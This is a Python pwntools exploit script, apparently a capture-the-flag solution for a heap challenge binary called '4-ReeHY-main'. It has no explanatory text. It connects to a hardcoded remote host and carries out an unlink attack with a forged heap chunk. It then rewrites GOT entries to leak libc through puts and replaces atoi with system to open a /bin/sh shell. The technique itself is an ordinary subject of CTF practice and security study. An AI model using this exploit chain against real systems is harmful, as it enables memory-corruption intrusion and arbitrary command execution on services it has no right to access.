from pwn import *
import sys
if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./4-ReeHY-main")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./4-ReeHY-main")
else:
	p = remote("111.198.29.45",31925)
	libc = ELF("./ctflibc.so.6")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
	elf = ELF("./4-ReeHY-main")

def debugf():
	gdb.attach(p,"b *0x4009D0\nb free")

def add(size,index,content):
	p.sendlineafter("$ ","1")
	p.sendafter("Input size\n",str(size))	
	p.sendlineafter("Input cun\n",str(index))	
	p.sendafter("Input content\n",content)

def free(index):
	p.sendlineafter("$ ","2")
	p.sendlineafter("Chose one to dele\n",str(index))
	#p.recvuntil("dele success!\n")
	
def edit(index,content):
	p.sendlineafter("$ ","3")
	p.sendlineafter("Chose one to edit\n",str(index))
	p.sendafter("Input the content\n",content)
	p.recvuntil("Edit success!\n")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-v"]
p.sendafter("Input your name: \n","b"*0x20)
#debugf()
add(0x80,0,"a"*8)
add(0x80,1,"b"*8)
add(0x70,2,"c"*8)
free(0)
free(1)
target = 0x6020e0
payload = p64(0) + p64(0x80) + p64(target - 0x18) + p64(target - 0x10) + "a"*0x60 + p64(0x80) + p64(0x90)
add(0x110,0,payload)
#debugf()
free(1)
free_got = elf.got["free"]
atoi_got = elf.got["atoi"]
puts_plt = elf.plt["puts"]
payload = p64(0)*3 + p64(free_got) + p64(1) + p64(atoi_got) + p64(1) + p64(atoi_got)
edit(0,payload)
edit(0,p64(puts_plt))
#debugf()
free(1)
atoi_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = atoi_addr - libc.symbols["atoi"]
log.success("libc_base:"+hex(libc.address))
edit(2,p64(libc.symbols["system"]))
p.sendlineafter("$ ","/bin/sh\x00")
p.interactive()
